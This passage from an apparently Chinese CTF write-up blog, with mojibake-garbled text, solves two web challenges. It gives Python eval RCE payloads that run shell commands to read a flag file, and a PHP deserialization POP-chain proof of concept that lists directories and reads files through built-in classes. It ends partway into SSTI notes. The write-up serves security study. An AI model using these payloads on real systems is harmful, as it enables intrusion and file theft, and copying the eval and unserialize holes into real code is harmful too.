request.args:</span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>æˆ‘ä»¬æ³¨æ„åˆ°ä¸€æ®µï¼ˆæ¯”è¾ƒç‹—è¡€çš„å°±æ˜¯æˆ‘ä¹‹å‰åœ¨ç™»å½•ç•Œé¢å¾˜å¾Šé‚£æ®µæ—¶é—´ï¼Œç”¨ç›®å½•æ‰«ææ‰«å‡ºäº†è¿™ä¸ªç©æ„ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def hello_world():</span><br><span class="line">    try:</span><br><span class="line">        s = request.args.get(&#x27;eval&#x27;)</span><br><span class="line">        return f&quot;hello,&#123;eval(s)&#125;&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    return &quot;hello&quot;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥å¯ä»¥rceäº†</p><p>payloadï¼š</p><p><code>/hello/?eval=**import**(&#39;os&#39;).popen(&#39;ls&#39;).read()</code></p><p><code>/hello/?eval=**import**(&#39;os&#39;).popen(&#39;ls /&#39;).read()</code></p><p><code>/hello/?eval=**import**(&#39;os&#39;).popen(&#39;cat /flag_is_h3re&#39;).read()</code></p><p>å¾—åˆ°flag</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled10.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled10.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="è¢«é—å¿˜çš„ååºåˆ—åŒ–ï¼ˆä¼°è®¡æ˜¯éé¢„æœŸè§£ï¼‰"><a href="#è¢«é—å¿˜çš„ååºåˆ—åŒ–ï¼ˆä¼°è®¡æ˜¯éé¢„æœŸè§£ï¼‰" class="headerlink" title="è¢«é—å¿˜çš„ååºåˆ—åŒ–ï¼ˆä¼°è®¡æ˜¯éé¢„æœŸè§£ï¼‰"></a><strong>è¢«é—å¿˜çš„ååºåˆ—åŒ–</strong>ï¼ˆä¼°è®¡æ˜¯éé¢„æœŸè§£ï¼‰</h1><ul><li><p>é¢˜ç›®ï¼š</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#Â å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;check.php&quot;);</span><br><span class="line"></span><br><span class="line">classÂ EeE&#123;</span><br><span class="line">Â Â Â Â publicÂ $text;</span><br><span class="line">Â Â Â Â publicÂ $eeee;</span><br><span class="line">Â Â Â Â publicÂ functionÂ __wakeup()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â ifÂ ($this-&gt;textÂ ==Â &quot;aaaa&quot;)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â echoÂ lcfirst($this-&gt;text);</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line">Â Â Â Â publicÂ functionÂ __get($kk)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â echoÂ &quot;$kk,eeeeeeeeeeeee&quot;;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line">Â Â Â Â publicÂ functionÂ __clone()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $aÂ =Â newÂ cycycycy;</span><br><span class="line">Â Â Â Â Â Â Â Â $aÂ -&gt;Â aaa();</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">classÂ cycycycy&#123;</span><br><span class="line">Â Â Â Â publicÂ $a;</span><br><span class="line">Â Â Â Â privateÂ $b;</span><br><span class="line"></span><br><span class="line">Â Â Â Â publicÂ functionÂ aaa()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $getÂ =Â $_GET[&#x27;get&#x27;];</span><br><span class="line">Â Â Â Â Â Â Â Â $getÂ =Â cipher($get);</span><br><span class="line">Â Â Â Â Â Â Â Â if($getÂ ===Â &quot;p8vfuv8g8v8py&quot;)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â eval($_POST[&quot;eval&quot;]);</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line">Â Â Â Â publicÂ functionÂ __invoke()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $a_aÂ =Â $thisÂ -&gt;Â a;</span><br><span class="line">Â Â Â Â Â Â Â Â echoÂ &quot;\$a_a\$&quot;;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">classÂ gBoBg&#123;</span><br><span class="line">Â Â Â Â publicÂ $name;</span><br><span class="line">Â Â Â Â publicÂ $file;</span><br><span class="line">Â Â Â Â publicÂ $coos;</span><br><span class="line">Â Â Â Â privateÂ $eeee=&quot;-_-&quot;;</span><br><span class="line">Â Â Â Â publicÂ functionÂ __toString()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â if(isset($this-&gt;name))&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $aÂ =Â newÂ $this-&gt;coos($this-&gt;file);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â echoÂ $a;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;elseÂ if(!isset($thisÂ -&gt;Â file))&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â returnÂ $this-&gt;coos-&gt;name;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;else&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $aaÂ =Â $this-&gt;coos;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $bbÂ =Â $this-&gt;file;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â returnÂ $aa();</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">classÂ w_wuw_w&#123;</span><br><span class="line">Â Â Â Â publicÂ $aaa;</span><br><span class="line">Â Â Â Â publicÂ $key;</span><br><span class="line">Â Â Â Â publicÂ $file;</span><br><span class="line">Â Â Â Â publicÂ functionÂ __wakeup()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â if(!preg_match(&quot;/php|63|\*|\?/i&quot;,$thisÂ -&gt;Â key))&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $this-&gt;keyÂ =Â file_get_contents($thisÂ -&gt;Â file);</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;else&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â echoÂ &quot;ä¸è¡Œå“¦&quot;;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line">Â Â Â Â publicÂ functionÂ __destruct()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â echoÂ $this-&gt;aaa;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â publicÂ functionÂ __invoke()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $thisÂ -&gt;Â aaaÂ =Â cloneÂ newÂ EeE;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_ipÂ =Â $_SERVER[&quot;HTTP_AAAAAA&quot;];</span><br><span class="line"></span><br><span class="line">unserialize($_ip);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>æŠŠä»£ç æ‹‰åˆ°vscodeæ¯”è¾ƒå®¹æ˜“çœ‹ä¸€äº›</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled11.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled11.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å…ˆçœ‹ä¸€ä¸‹é¢˜ç›®çš„ä»£ç ï¼Œååºåˆ—åŒ–çš„æ³¨å…¥ç‚¹åœ¨<code>$_ipÂ =Â $_SERVER[&quot;HTTP_AAAAAA&quot;];</code></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨httpè¯·æ±‚å¤´æ³¨å…¥ä¸€ä¸ªå‚æ•°ï¼šAAAAAA:xxxï¼ˆxxxä¸ºååºåˆ—åŒ–çš„å†…å®¹ï¼‰</p><p>è¿™é‡Œç›´æ¥æŒ‘é‡ç‚¹çœ‹äº†ï¼ˆæ¯•ç«Ÿåªç”¨åˆ°2ä¸ªç±»ï¼‰ï¼ˆæ­¤å¤„çœç•¥äº†å…¶ä»–æ²¡ç”¨åˆ°çš„ä¸œè¥¿ï¼Œæ–¹ä¾¿ç†è§£ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment">#__toStringé­”æœ¯å‡½æ•°ï¼Œä½†ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è¢«è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;  <span class="comment">#nameæœ‰å®šä¹‰ï¼Œä½†å®šä¹‰ä»€ä¹ˆæ²¡æœ‰å…³ç³»ï¼Œå› ä¸ºåé¢æ²¡ç”¨åˆ°</span></span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file); <span class="comment">#coosä½œä¸ºå‡½æ•°çš„åï¼Œfileä½œå‡½æ•°çš„å‚æ•°</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># è¾“å‡º</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“åœ¨phpä¸­æ”¯æŒä½¿ç”¨<code>$a($b)</code>è¿™æ ·åŠ¨æ€çš„å½¢å¼è°ƒç”¨å‡½æ•°&#x2F;å®ä¾‹åŒ–ï¼Œ</p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™ä¸€è¡Œå°±æ˜¯è¿™æ ·çš„å½¢å¼ï¼š<code>$a = new $this-&gt;coos($this-&gt;file);</code></p><p>æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯æ˜¯é€šè¿‡ç»™cooså’Œfileèµ‹å€¼ï¼Œå®ç°rceæˆ–è€…æ–‡ä»¶æ“ä½œ</p><ul><li>æœ‰äººå°±é—®äº†ï¼šcoosæˆ‘ç”¨äº†<code>file_get_contentsï¼Œ</code>fileæˆ‘ä¼ å…¥äº†åœ°å€ï¼Œä¸ºä»€ä¹ˆè¯»å–ä¸åˆ°æ–‡ä»¶ã€‚</li></ul><p>ç­”ï¼šå› ä¸ºè¿™è¡Œä»£ç æ˜¯å¯¹è±¡å®ä¾‹åŒ–ï¼Œè€Œ<code>file_get_contents</code>æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸æ˜¯ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œcoosè¦ä¼ å…¥ä¸€ä¸ªå†…ç½®ç±»äº†</p><p>è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆå†…ç½®ç±»äº†</p><blockquote><p>å¯éå†ç›®å½•ç±»æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p></blockquote><ul><li>DirectoryIterator ç±»</li><li>FilesystemIterator ç±»</li><li>GlobIterator ç±»</li></ul><blockquote><p>å¯è¯»å–æ–‡ä»¶ç±»æœ‰ï¼š</p></blockquote><ul><li>SplFileObject ç±»</li></ul><p>æˆ‘ä»¬éœ€è¦ç”¨å†…ç½®ç±»æ¥éå†ç›®å½•ï¼Œç„¶åè¯»å–æ–‡ä»¶</p><p>POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="comment">// private $eeee=&quot;-_-&quot;;</span></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;name=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br></pre></td></tr></table></figure><p>åˆ†ä¸¤æ­¥èµ°ï¼Œç¬¬ä¸€æ­¥è¯»å–æ–‡ä»¶ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;glob:///*f*&quot;</span>; <span class="comment">#ä½¿ç”¨globåæ¥æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ è¿™é‡Œ/*f*åŒ¹é…äº†æ ¹ç›®å½•ä¸‹åŒ…å«fçš„æ–‡ä»¶å¤¹å</span></span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;DirectoryIterator&quot;</span>;</span><br><span class="line"></span><br><span class="line">å¾—åˆ°ï¼šO:<span class="number">7</span>:<span class="string">&quot;w_wuw_w&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;gBoBg&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;glob:///*f*&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;coos&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;DirectoryIterator&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled12.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled12.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>ç¬¬äºŒæ­¥ï¼Œä½¿ç”¨<code>SplFileObject</code>ç±»è¯»å–æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">å¾—åˆ°ï¼šO:<span class="number">7</span>:<span class="string">&quot;w_wuw_w&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;gBoBg&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;/f1agaaa&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;coos&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;SplFileObject&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled13.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled13.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>SSTIçŸ¥è¯†ç‚¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">**<span class="keyword">class</span>**            ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚</span><br><span class="line">**base**             ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»</span><br><span class="line">**bases**            ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ **basesmro**              æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚</span><br><span class="line">**subclasses**()     è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆï¼ŒEach <span class="keyword">class</span> <span class="title class_">keeps</span> a <span class="built_in">list</span> of weak references to its immediate subclasses. This method returns a <span class="built_in">list</span> of <span class="built_in">all</span> those references still alive. The <span class="built_in">list</span> <span class="keyword">is</span> <span class="keyword">in</span> definition order.</span><br><span class="line">**init**             åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function</span><br><span class="line">**<span class="built_in">globals</span>**          ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.**globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚</span><br><span class="line">dic              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ</span><br><span class="line">getattribute()   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼š[a.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚](http://a.xxx/a.xxx()%EF%BC%<span class="number">89</span>%EF%BC%8C%E9%<span class="number">83</span>%BD%E4%BC%9A%E8%<span class="number">87</span>%AA%E5%8A%A8%E5%8E%BB%E8%B0%<span class="number">83</span>%E7%<span class="number">94</span>%A8__getattribute__%E6%<span class="number">96</span>%B9%E6%B3%<span class="number">95</span>%E3%<span class="number">80</span>%<span class="number">82</span>%E5%9B%A0%E6%AD%A4%E6%<span class="number">88</span>%<span class="number">91</span>%E4%BB%AC%E5%<span class="number">90</span>%8C%E6%A0%B7%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E9%<span class="number">80</span>%9A%E8%BF%<span class="number">87</span>%E8%BF%<span class="number">99</span>%E4%B8%AA%E6%<span class="number">96</span>%B9%E6%B3%<span class="number">95</span>%E6%9D%A5%E8%8E%B7%E5%8F%<span class="number">96</span>%E5%<span class="number">88</span>%B0%E5%AE%9E%E4%BE%8B%E3%<span class="number">80</span>%<span class="number">81</span>%E7%B1%BB%E3%<span class="number">80</span>%<span class="number">81</span>%E5%<span class="number">87</span>%BD%E6%<span class="number">95</span>%B0%E7%9A%<span class="number">84</span>%E5%B1%9E%E6%<span class="number">80</span>%A7%E3%<span class="number">80</span>%<span class="number">82</span>)getitem()        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a[<span class="string">&#x27;b&#x27;</span>]ï¼Œå°±æ˜¯a.getitem(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">builtins         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚</span><br><span class="line"><span class="keyword">import</span>           åŠ¨æ€åŠ 